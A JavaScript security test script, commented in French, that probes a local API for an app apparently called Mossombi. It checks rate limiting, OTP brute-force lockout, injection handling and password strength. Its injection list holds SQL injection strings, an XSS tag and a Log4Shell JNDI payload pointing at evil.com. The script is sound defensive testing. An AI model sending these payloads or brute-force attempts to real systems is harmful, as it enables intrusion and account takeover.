/**
 * TEST AGRESSIF DE SÉCURITÉ
 * Tests intensifs pour déclencher les protections
 */

import axios from 'axios';

const API_BASE = 'http://localhost:3000/api/v1';

console.log('💥 TESTS AGRESSIFS DE SÉCURITÉ MOSSOMBI\n');

// Test Rate Limiting agressif
async function testAggressiveRateLimit() {
  console.log('💥 TEST: Rate Limiting Agressif (150 requêtes)');
  
  const promises = [];
  
  // Lancer 150 requêtes simultanées
  for (let i = 0; i < 150; i++) {
    const promise = axios.get(`${API_BASE}/auth/check-phone?phone=%2B242066${String(i).padStart(6, '0')}`)
      .then(() => ({ request: i + 1, status: 'OK' }))
      .catch(error => ({ 
        request: i + 1, 
        status: error.response?.status || 'ERROR',
        blocked: error.response?.status === 429,
        message: error.response?.data?.error
      }));
    
    promises.push(promise);
  }
  
  try {
    const results = await Promise.all(promises);
    const blocked = results.filter(r => r.blocked).length;
    const successful = results.filter(r => r.status === 'OK').length;
    
    console.log(`   ✅ Requêtes réussies: ${successful}`);
    console.log(`   🚫 Requêtes bloquées: ${blocked}`);
    console.log(`   📊 Taux de blocage: ${Math.round((blocked / 150) * 100)}%`);
    
    if (blocked > 0) {
      console.log('   ✅ RATE LIMITING FONCTIONNE');
    } else {
      console.log('   ❌ RATE LIMITING DÉFAILLANT');
    }
  } catch (error) {
    console.log('   ❌ Erreur test:', error.message);
  }
}

// Test Force Brute amélioré
async function testImprovedBruteForce() {
  console.log('\n💥 TEST: Force Brute Amélioré');
  
  const testPhone = '+242066777999';
  
  try {
    // 1. Créer un compte valide
    console.log('   📱 Création compte test...');
    const registerResponse = await axios.post(`${API_BASE}/auth/register`, {
      phone: testPhone,
      full_name: 'Security Test User',
      password: 'SecurePassword123!@#',
      country_code: 'CG'
    });
    
    console.log('   ✅ Compte créé, OTP envoyé');
    
    // 2. Tenter plusieurs codes OTP
    console.log('   🔓 Tentatives de force brute...');
    
    for (let i = 0; i < 8; i++) {
      const fakeOTP = String(i).repeat(6); // 000000, 111111, etc.
      
      try {
        await axios.post(`${API_BASE}/auth/verify-otp`, {
          phone: testPhone,
          otp_code: fakeOTP
        });
        console.log(`   Tentative ${i + 1} (${fakeOTP}): ❌ ACCEPTÉ (VULNÉRABILITÉ!)`);
      } catch (error) {
        const isBlocked = error.response?.data?.code === 'ACCOUNT_BLOCKED';
        const message = error.response?.data?.error || 'Erreur inconnue';
        
        console.log(`   Tentative ${i + 1} (${fakeOTP}): ${isBlocked ? '🚫 BLOQUÉ' : '❌ REJETÉ'}`);
        
        if (isBlocked) {
          console.log('   ✅ PROTECTION FORCE BRUTE ACTIVÉE');
          break;
        }
      }
    }
    
  } catch (error) {
    if (error.response?.data?.code === 'WEAK_PASSWORD') {
      console.log('   ✅ Mot de passe rejeté par sécurité');
    } else {
      console.log('   ❌ Erreur:', error.response?.data?.error || error.message);
    }
  }
}

// Test injection SQL/XSS
async function testInjectionAttacks() {
  console.log('\n💥 TEST: Tentatives d\'injection');
  
  const maliciousInputs = [
    "'; DROP TABLE users; --",
    "<script>alert('XSS')</script>",
    "' OR '1'='1",
    "admin'--",
    "${jndi:ldap://evil.com/a}"
  ];
  
  for (const [index, malicious] of maliciousInputs.entries()) {
    try {
      await axios.get(`${API_BASE}/auth/check-phone?phone=${encodeURIComponent(malicious)}`);
      console.log(`   Input ${index + 1}: ❌ ACCEPTÉ (Potentielle vulnérabilité)`);
    } catch (error) {
      const status = error.response?.status;
      if (status === 400) {
        console.log(`   Input ${index + 1}: ✅ REJETÉ (Validation)`);
      } else if (status === 429) {
        console.log(`   Input ${index + 1}: ✅ BLOQUÉ (Rate limit)`);
      } else {
        console.log(`   Input ${index + 1}: ⚠️  Erreur ${status}`);
      }
    }
  }
}

// Test mots de passe avec données personnelles
async function testPersonalDataPasswords() {
  console.log('\n💥 TEST: Mots de passe avec données personnelles');
  
  const testCases = [
    { name: 'Jean Dupont', phone: '+242066111001', password: 'Jean123!' },
    { name: 'Marie Test', phone: '+242066111002', password: 'Marie2023!' },
    { name: 'Paul Martin', phone: '+242066111003', password: 'Paul066111003!' }
  ];
  
  for (const testCase of testCases) {
    try {
      await axios.post(`${API_BASE}/auth/register`, {
        phone: testCase.phone,
        full_name: testCase.name,
        password: testCase.password,
        country_code: 'CG'
      });
      console.log(`   "${testCase.password}": ❌ ACCEPTÉ (Contient données personnelles)`);
    } catch (error) {
      if (error.response?.data?.code === 'WEAK_PASSWORD') {
        console.log(`   "${testCase.password}": ✅ REJETÉ (Données personnelles détectées)`);
      } else {
        console.log(`   "${testCase.password}": ⚠️  Autre erreur`);
      }
    }
  }
}

// Exécuter tous les tests
async function runAggressiveTests() {
  const startTime = Date.now();
  
  await testAggressiveRateLimit();
  await testImprovedBruteForce();
  await testInjectionAttacks();
  await testPersonalDataPasswords();
  
  const endTime = Date.now();
  const duration = Math.round((endTime - startTime) / 1000);
  
  console.log(`\n🎯 TESTS AGRESSIFS TERMINÉS en ${duration}s`);
  console.log('📊 Vérifiez les logs du serveur pour l\'audit détaillé');
  console.log('🔍 Consultez les fichiers d\'audit dans ./logs/audit/');
}

runAggressiveTests().catch(console.error);
